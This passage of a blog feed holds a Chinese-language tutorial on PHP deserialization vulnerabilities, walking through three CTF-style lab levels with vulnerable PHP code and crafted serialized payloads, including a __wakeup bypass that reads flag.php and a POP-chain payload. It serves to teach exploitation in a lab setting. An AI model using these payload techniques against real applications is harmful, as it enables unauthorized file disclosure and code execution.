class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>生成的payload如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;start_gg&quot;:2:&#123;s:4:&quot;mod1&quot;;O:4:&quot;Call&quot;:2:&#123;s:4:&quot;mod1&quot;;O:5:&quot;funct&quot;:2:&#123;s:4:&quot;mod1&quot;;O:4:&quot;func&quot;:2:&#123;s:4:&quot;mod1&quot;;O:7:&quot;string1&quot;:2:&#123;s:4:&quot;str1&quot;;O:7:&quot;GetFlag&quot;:0:&#123;&#125;s:4:&quot;str2&quot;;N;&#125;s:4:&quot;mod2&quot;;N;&#125;s:4:&quot;mod2&quot;;N;&#125;s:4:&quot;mod2&quot;;N;&#125;s:4:&quot;mod2&quot;;N;&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;PHP反序列化漏洞&quot;&gt;&lt;a href=&quot;#PHP反序列化漏洞&quot; class=&quot;headerlink&quot; title=&quot;PHP反序列化漏洞&quot;&gt;&lt;/a&gt;PHP反序列化漏洞&lt;/h1&gt;&lt;h3 id=&quot;PHP序列化与反序列化意义&quot;&gt;&lt;a href=&quot;#PHP序列化与反序列化意义&quot; class=&quot;headerlink&quot; title=&quot;PHP序列化与反序列化意义&quot;&gt;&lt;/a&gt;PHP序列化与反序列化意义&lt;/h3&gt;&lt;p&gt;在开发的过程中常常遇到需要把&lt;strong&gt;对象&lt;/strong&gt;或者&lt;strong&gt;数组&lt;/strong&gt;进行序列号存储，反序列化输出的情况。特别是当需要把数组存储到mysql数据库中时，我们时常需要将数组进行序列号操作。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;序列化&lt;/strong&gt;（串行化）：是将变量转换为可保存或传输的字符串的过程；&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;反序列化&lt;/strong&gt;（反串行化）：就是在适当的时候把这个字符串再转化成原来的变量使用。&lt;/p&gt;
&lt;p&gt;这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。&lt;/p&gt;
&lt;p&gt;常见的php系列化和反系列化方式主要有：serialize，unserialize；json_encode，json_decode。 &lt;/p&gt;</summary>
    
    
    
    
    <category term="PHP反序列化" scheme="http://example.com/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化入门</title>
    <link href="http://example.com/2020/11/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8/"/>
    <id>http://example.com/2020/11/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8/</id>
    <published>2020-11-09T01:50:53.000Z</published>
    <updated>2020-11-09T01:51:47.709Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h1><h3 id="PHP序列化与反序列化意义"><a href="#PHP序列化与反序列化意义" class="headerlink" title="PHP序列化与反序列化意义"></a>PHP序列化与反序列化意义</h3><p>在开发的过程中常常遇到需要把<strong>对象</strong>或者<strong>数组</strong>进行序列号存储，反序列化输出的情况。特别是当需要把数组存储到mysql数据库中时，我们时常需要将数组进行序列号操作。</p><p><strong>序列化</strong>（串行化）：是将变量转换为可保存或传输的字符串的过程；</p><p><strong>反序列化</strong>（反串行化）：就是在适当的时候把这个字符串再转化成原来的变量使用。</p><p>这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。</p><p>常见的php系列化和反系列化方式主要有：serialize，unserialize；json_encode，json_decode。 </p><a id="more"></a><h3 id="PHP序列化与反序列化入门"><a href="#PHP序列化与反序列化入门" class="headerlink" title="PHP序列化与反序列化入门"></a>PHP序列化与反序列化入门</h3><p>首先定义了一个类，其中包含两个共有变量<code>name</code>和<code>pass</code>。</p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109094910.png" alt="image-20201108162349456"></p><p>序列化成了一长串字符串。其中O代表对象，4代表长度，come表示对象的名字，2表示对象有两个成员。括号里面就是描述这些成员。s表示是字符串，4表示该字符串中有4个字符。先尝试输出<code>$name</code>和<code>pass</code></p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109094916.png" alt="image-20201108164117690"></p><p>我对php反序列化漏洞的理解就是：新建了一个对象，并修改其中的成员变量，利用对象中的函数执行我们想让其执行的命令。我认为可以将其理解为SQL注入，注入的参数由攻击者任意设计，但是其中的过滤函数我们没办法修改，这里的成员函数就类似于sql注入中的过滤函数，只能使劲的想办法绕过，或者在php反序列化中使劲的利用这些函数进行命令等执行。</p><p>例如想让<code>getInfo</code>输出一些其他的东西。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">come</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;Rainbow&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$pass</span>=<span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Username: &#x27;</span> . <span class="keyword">$this</span>-&gt;name . <span class="string">&quot; Password: &quot;</span> . <span class="keyword">$this</span>-&gt;pass;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$come1</span> = <span class="keyword">new</span> come();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$come1</span>-&gt;getInfo().<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;come&#x27;</span>])-&gt;getInfo();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$come1</span>-&gt;getInfo().<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109094920.png" alt="image-20201108170225906"></p><p>可以看到，<code>Username</code>和<code>Password</code>的值已经变了，其实就是新建了一个对象，然后调用<code>come</code>对象里面的<code>getInfo</code>函数输出 。</p><p>上面只是一个public的案例，接下来再看看成员变量是private时候的情况。private修饰的成员变量在序列化时会产生一个从%00经过urldecode解码后的符号来显出他的特殊。说起来绕口，直接上图片：</p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109094926.png" alt="image-20201108185458912"></p><p>显示不出来的，就是%00经过url解码后的符号。相应的protected修饰的成员变量序列化的情况如下：</p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109094929.png" alt="image-20201108190839867"></p><p>protected使用的前缀为%00*%00 对成员变量进行修饰。</p><h3 id="PHP类的魔术方法"><a href="#PHP类的魔术方法" class="headerlink" title="PHP类的魔术方法"></a>PHP类的魔术方法</h3><p>魔术方法就是在序列化或者反序列化的时候，程序会”情不自禁”的去调用这些函数。常见的有下面5个</p><ul><li>__construct 当一个对象创建时被调用</li><li>__destruct 当一个对象销毁时被调用</li><li>__toString 当一个对象被当作一个字符串使用</li><li>__sleep 在对象被序列化之前运行</li><li>__wakeup 在对象被反序列化之后被调用</li><li>__call():当要调用的方法不存在或权限不足时自动调用</li><li>__invoke():当把一个类当作函数使用时自动调用</li></ul><p>拿网上最好的例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">&#x27;construct run&#x27;</span>;</span><br><span class="line"></span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">&#x27;destruct run&#x27;</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">&#x27;toString run&#x27;</span>;</span><br><span class="line">                  <span class="keyword">return</span> <span class="string">&#x27;qwe&#x27;</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">&#x27;sleep run&#x27;</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">&#x27;wakeup run&#x27;</span>;</span><br><span class="line">         &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$test</span>= <span class="keyword">new</span> Test(); <span class="comment">// 创建对象的时候运行 construct</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sTest</span>= serialize(<span class="variable">$test</span>); <span class="comment">// 序列化的时候先调用 sleep</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$usTest</span>= unserialize(<span class="variable">$sTest</span>); <span class="comment">// 反序列先调用__wakeup函数</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$string</span>= <span class="string">&#x27;hello class &#x27;</span> . <span class="variable">$test</span>;  <span class="comment">// 调用toString函数</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">    <span class="comment">//整个结束调用destruct函数</span></span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><h4 id="关卡一"><a href="#关卡一" class="headerlink" title="关卡一"></a>关卡一</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$KEY</span> = <span class="string">&quot;D0g3!!!&quot;</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (unserialize(<span class="variable">$str</span>) === <span class="string">&quot;<span class="subst">$KEY</span>&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到如果反序列化<code>$_GET&#123;&#39;str&#39;]</code>之后的内容为<code>D0g3!!!</code>，那么就能成功。那就简单了，逆向考虑，<code>$str=serialize($KEY)</code>即可</p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109094936.png" alt="image-20201108203657455"></p><h4 id="关卡二"><a href="#关卡二" class="headerlink" title="关卡二"></a>关卡二</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123; </span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">                <span class="keyword">if</span>(strchr(<span class="keyword">$this</span>-&gt; file,<span class="string">&quot;\\&quot;</span>)===<span class="literal">false</span> &amp;&amp;  strchr(<span class="keyword">$this</span>-&gt;file, <span class="string">&#x27;/&#x27;</span>)===<span class="literal">false</span>)</span><br><span class="line">                    show_source(dirname (<span class="keyword">__FILE__</span>).<span class="string">&#x27;/&#x27;</span>.<span class="keyword">$this</span> -&gt;file);</span><br><span class="line">                <span class="keyword">else</span>      </span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Wrong filename.&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">            <span class="keyword">$this</span>-&gt; file=<span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123; </span><br><span class="line">        show_source(<span class="string">&#x27;index.php&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="variable">$file</span>=base64_decode( <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]); </span><br><span class="line">        <span class="keyword">echo</span> unserialize(<span class="variable">$file</span> ); </span><br><span class="line">    &#125; </span><br><span class="line"><span class="meta">?&gt;</span>   &lt;!--key in flag.php--&gt;</span><br></pre></td></tr></table></figure><p>这里通过<code>$_GET[&#39;file&#39;]</code>获取然后base64解码，然后再执行反序列化。然后看下漏洞怎么利用，反序列化会首先调用<code>wakeup</code>函数，在这里，会直接把文件名直接给替换成<code>index.php</code>，然后才会show源码。既然不能改变<code>$file</code>的值，那么只有绕过这个函数了。</p><p>构造payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;SoFun&quot;:1:&#123;s:7:&quot;%00*%00file&quot;;s:8:&quot;flag.php&quot;;&#125;    这是正常构造的payload，但是这个payload会经过wakeup函数</span><br><span class="line"></span><br><span class="line">但是要想绕过wakeup，需要修改到下面这种形式</span><br><span class="line"></span><br><span class="line">O:5:&quot;SoFun&quot;:2:&#123;s:7:&quot;%00*%00file&quot;;s:8:&quot;flag.php&quot;;&#125;    这里就能绕过wakeup函数，将成员函数的变量设置成比实际成员变量大，就能绕过</span><br></pre></td></tr></table></figure><p>绕过具体可以参考<a href="https://www.cnblogs.com/zy-king-karl/p/11436872.html">https://www.cnblogs.com/zy-king-karl/p/11436872.html</a></p><h4 id="关卡三"><a href="#关卡三" class="headerlink" title="关卡三"></a>关卡三</h4><p>来源：<a href="https://bbs.ichunqiu.com/thread-45290-1-1.html?from=aqzx4">https://bbs.ichunqiu.com/thread-45290-1-1.html?from=aqzx4</a></p><p>一串连环套的调用案例，源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$test2</span>,<span class="variable">$arr</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$s1</span> = <span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        <span class="variable">$s1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod2 = <span class="string">&quot;`字符串拼接`&quot;</span>.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag:&quot;</span>.<span class="string">&quot;xxxxxxxxxxxx&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;string&#x27;</span>];</span><br><span class="line">unserialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>那只有倒退了。要想获取flag，就要调用<code>get_flag</code>函数，要想调用<code>get_flag</code>函数，就需要掉i用<code>__toString</code>方法，而这个方法只在被当作字符串输出的时候才会被调用，有输出的就是<code>func</code>类里面的<code>invoke</code>函数，而<code>invoke</code>函数只有把类当作函数使用的时候才会被调用，然后又看到<code>funct</code>对象，而<code>call</code>只有调用方法不存在的情况下被调用，再看到<code>Call</code>，里面调用了一个不知道的函数，然后就追溯到<code>destruct</code>函数。构造payload：</p><p>在每个函数里面添加一个 construct初始化函数，并指向下一个函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> Call();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> funct();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> func();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$test2</span>,<span class="variable">$arr</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$s1</span> = <span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        <span class="variable">$s1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> string1();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod2 = <span class="string">&quot;`字符串拼接`&quot;</span>.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str2</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1 = <span class="keyword">new</span> GetFlag();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag:&quot;</span>.<span class="string">&quot;xxxxxxxxxxxx&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> start_gg());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>生成的payload如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 